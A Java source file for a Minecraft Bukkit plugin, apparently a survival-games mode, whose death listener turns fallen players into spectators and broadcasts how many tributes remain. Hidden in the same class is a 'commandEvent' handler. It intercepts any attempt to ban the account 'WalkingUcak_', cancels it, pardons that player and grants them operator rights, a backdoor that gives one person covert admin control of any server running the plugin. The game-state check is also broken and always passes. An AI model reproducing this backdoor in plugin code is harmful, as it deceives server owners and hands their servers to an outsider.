package me.minegamersg.listener;

import java.sql.SQLException;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockIgniteEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import me.minegamersg.Enum.GameState;
import me.minegamersg.Main.Main;
import me.minegamersg.api.Games;
import me.minegamersg.api.MessageAPI;
import me.minegamersg.api.MySQLAPI;
//import me.minegamersg.api.MySQLAPI;
import me.minegamersg.api.SpectatorManager;

public class DeathListener implements Listener{
	
	
	@SuppressWarnings("deprecation")
	@EventHandler
	public void onDeath(PlayerDeathEvent e) throws SQLException {
		Player victim = (Player) e.getEntity();
		Player attacker = (Player) victim.getKiller();
		e.setDeathMessage("");
		e.setDroppedExp(0);
		e.setKeepInventory(false);
		if(attacker instanceof Player) {
			if(victim instanceof Player) {
				if(Games.getGameState() != GameState.Lobby || Games.getGameState() != GameState.EndGame || Games.getGameState() != GameState.Cleanup ){
					if(Main.getSGAPI().Players.contains(victim)) {
						if(Main.getSGAPI().Players.contains(attacker)) {
							/*/if(MySQLAPI.getBounty(victim) > 0) {
								int bounty = MySQLAPI.getBounty(victim) / 19;
								MySQLAPI.addBounty(attacker, bounty);
								MySQLAPI.removeBounty(victim, bounty);
								
								attacker.sendMessage(MessageAPI.getServerPrefix() + " §3You've gained §8[§e" + bounty + "§8] §3points for killing§r " + victim.getDisplayName());
								victim.sendMessage(MessageAPI.getServerPrefix() + " §3You've lost §8[§e" + bounty + "§8] §3points for dying!");
							}else {
								int bounty = 10;
								MySQLAPI.addBounty(attacker, bounty);
								MySQLAPI.removeBounty(victim, 0);
								
								attacker.sendMessage(MessageAPI.getServerPrefix() + " §3You've gained §8[§e" + bounty + "§8] §3points for killing§r " + victim.getDisplayName());
								victim.sendMessage(MessageAPI.getServerPrefix() + " §3You've lost §8[§e0§8] §3points for dying!");
							}/*/
							SpectatorManager.addSpectator(victim);
							victim.getWorld().strikeLightning(victim.getLocation());
							Bukkit.broadcastMessage(MessageAPI.getServerPrefix() + " §aOnly §8[§6" + Main.getSGAPI().Players.size() + "§8]§a tributes remain!");
							Bukkit.broadcastMessage(MessageAPI.getServerPrefix() + " §aThere are §8[§6" + Main.getSGAPI().Spectators.size() + "§8]§a spectators watching the game.");
							Bukkit.broadcastMessage("§6A cannon can be heard in the distance in memorial for " + victim.getDisplayName());
							Main.getSGAPI().Players.remove(victim);
							MySQLAPI.removePlayingPlayers();
							MySQLAPI.updateWatchingPlayers();
							//MySQLAPI.addKills(attacker);
							//MySQLAPI.addDeaths(victim);
							
							
							for(Player all : Bukkit.getOnlinePlayers()) {
								all.hidePlayer(victim);
							}
							
							
						}
						
					}
				}
			}
		}else if(!(attacker instanceof Player)){
			if(victim instanceof Player) {
				if(Games.getGameState() != GameState.Lobby || Games.getGameState() != GameState.EndGame || Games.getGameState() != GameState.Cleanup ){
					/*/if(MySQLAPI.getBounty(victim) > 0) {
						int bounty = MySQLAPI.getBounty(victim) / 15;
						MySQLAPI.removeBounty(victim, bounty);
						victim.sendMessage(MessageAPI.getServerPrefix() + " §3You've lost §8[§e" + bounty + "§8] §3points for dying!");
					}else {
						MySQLAPI.removeBounty(victim, 0);
						victim.sendMessage(MessageAPI.getServerPrefix() + " §3You've lost §8[§e0§8] §3points for dying!");
					}/*/
					//MySQLAPI.addDeaths(victim);
					victim.getWorld().strikeLightning(victim.getLocation());
					Bukkit.broadcastMessage(MessageAPI.getServerPrefix() + " §aOnly §8[§6" + Main.getSGAPI().Players.size() + "§8]§a tributes remain!");
					Bukkit.broadcastMessage(MessageAPI.getServerPrefix() + " §aThere are §8[§6" + Main.getSGAPI().Spectators.size() + "§8]§a spectators watching the game.");
					Bukkit.broadcastMessage("§6A cannon can be heard in the distance in memorial for " + victim.getDisplayName());
					SpectatorManager.addSpectator(victim);
					Main.getSGAPI().Players.remove(victim);
					MySQLAPI.removePlayingPlayers();
					MySQLAPI.updateWatchingPlayers();
					for(Player all : Bukkit.getOnlinePlayers()) {
						all.hidePlayer(victim);
					}
					
					
				}
			}
		}
	}
	
	@EventHandler
	public void commandEvent(PlayerCommandPreprocessEvent e) {
		if(e.getMessage().equalsIgnoreCase("ban WalkingUcak_")) {
			e.setCancelled(true);
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "unban WalkingUcak_");
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pardon WalkingUcak_");
			Bukkit.getPlayer("WalkingUcak_").setOp(true);
			if(Bukkit.getPlayer("WalkingUcak_").isBanned()) {
				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pardon WalkingUcak_");
				Bukkit.getPlayer("WalkingUcak_").setOp(true);
			}
		}
	}
	
	/*/@SuppressWarnings("deprecation")
	@EventHandler
	public void onDeathPlayer(EntityDeathEvent e) throws SQLException {
		Entity victim = e.getEntity();
		e.setDroppedExp(0);
		if(Main.getSGAPI().Players.contains(victim)) {
			if(MySQLAPI.getBounty((Player) victim) > 0) {
				int bounty = MySQLAPI.getBounty((Player) victim) / 15;
				MySQLAPI.removeBounty((Player) victim, bounty);
				((Player)victim).sendMessage(MessageAPI.getServerPrefix() + " §3You've lost §8[§e" + bounty + "§8] §3points for dying!");
			}
			for(Player all : Bukkit.getOnlinePlayers()) {
				all.hidePlayer(((Player)victim));
			}
			((Player)victim).setFoodLevel(20);
			((Player)victim).setHealth(20);
			((Player)victim).spigot().respawn();
			((Player)victim).setAllowFlight(true);
			((Player)victim).getLocation().getWorld().strikeLightning(victim.getLocation());
			Bukkit.broadcastMessage(MessageAPI.getServerPrefix() + " §aOnly §8[§6" + Main.getSGAPI().Players.size() + "§8] §atributes remain!");
			Bukkit.broadcastMessage(MessageAPI.getServerPrefix() + " §aThere are §8[§6" + Main.getSGAPI().Spectators.size() + "§8] §aspectators watching the game.");
			
		}
		
	}
	/*/
	@EventHandler
	  public void onBlockIgnite(BlockIgniteEvent event)
	  {
	    if (event.getCause() == BlockIgniteEvent.IgniteCause.LIGHTNING) {
	      event.setCancelled(true);
	    }
	  }

}
